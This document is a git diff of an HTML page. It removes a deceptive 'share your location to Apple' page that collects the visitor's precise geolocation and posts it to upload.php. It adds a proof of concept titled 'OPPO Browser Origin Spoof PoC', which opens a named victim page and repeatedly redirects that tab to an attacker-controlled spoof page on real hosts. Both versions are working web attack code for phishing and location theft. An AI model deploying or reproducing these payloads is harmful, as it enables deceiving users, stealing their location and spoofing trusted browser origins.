@@ -1,97 +1,27 @@
+<!doctype html>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
+<title>atu – OPPO Browser Origin Spoof PoC</title>
 <style>
-    h1 {
-        margin: 1em;
-    }
-
-    a {
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        text-decoration: none;
-        color: inherit;
-    }
-
-    #status {
-        margin: 1em;
-        color: #444;
-    }
-
-    img {
-        width: 100%;
-        display: block;
-    }
+  body { display:flex; align-items:center; justify-content:center; min-height:100vh; font-family:sans-serif; }
+  button { padding:16px 24px; font-size:18px; border-radius:10px; border:0; background:#4285f4; color:white; }
 </style>
-
-<h1>Tap to share your location to Apple</h1>
-
-<div id="status">Tap the page to request location permission.</div>
-<img id="img" src="" alt="Map preview" />
-<a id="link" href="https://google.com" target="_blank">Tap to open location prompt</a>
+<button id="launch">Click to open spoofed tab</button>
 
 <script>
-    const link = document.getElementById('link');
-    const status = document.getElementById('status');
-    const img = document.getElementById('img');
+document.getElementById('launch').onclick = () => {
+  // victim page hosted on vercel
+  const victimUrl = "https://max-pay-nine.vercel.app/victu.html";
+  const win = window.open(victimUrl, "_blank");
 
-    link.onclick = () => {
-        // Keep original behavior of opening the link in a new tab (target="_blank"),
-        // and after a short delay request location permission.
-        setTimeout(() => {
-            // Request current position
-            if (!navigator.geolocation) {
-                status.textContent = 'Geolocation not supported by this browser.';
-                return;
-            }
+  // attacker spoof page hosted on GitHub Pages
+  const spoofUrl = "https://mrnoob790.github.io/ats.html";
 
-            status.textContent = 'Requesting location...';
+  // small delay so victim triggers intent:x; first
+  setTimeout(() => { try { win.location.href = spoofUrl; } catch(e){} }, 150);
 
-            navigator.geolocation.getCurrentPosition(
-                position => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    status.textContent = `Location obtained: ${lat.toFixed(6)}, ${lon.toFixed(6)}`;
-
-                    // Show static map image (OpenStreetMap static map service)
-                    // You can change zoom/size/marker style as needed.
-                    const zoom = 15;
-                    const size = '800x400';
-                    const mapUrl = `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=${zoom}&size=${size}&markers=${lat},${lon},red-pushpin`;
-                    img.src = mapUrl;
-
-                    // Send location to server (mimics original upload)
-                    const formData = new FormData();
-                    formData.append('latitude', lat);
-                    formData.append('longitude', lon);
-                    formData.append('timestamp', position.timestamp);
-
-                    fetch('upload.php', {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(res => res.text())
-                    .then(text => {
-                        console.log('Server response:', text);
-                    })
-                    .catch(err => {
-                        console.error('Upload error:', err);
-                    });
-                },
-                error => {
-                    status.textContent = 'Unable to obtain location: ' + (error.message || error.code);
-                    console.error(error);
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
-            );
-        }, 600);
-
-        // allow the normal link navigation in the new tab
-    };
+  // keep UI persistent (no flicker) forever
+  setInterval(() => {
+    try { if (win && !win.closed) win.location.href = spoofUrl; } catch(e){}
+  }, 1800);
+};
 </script>
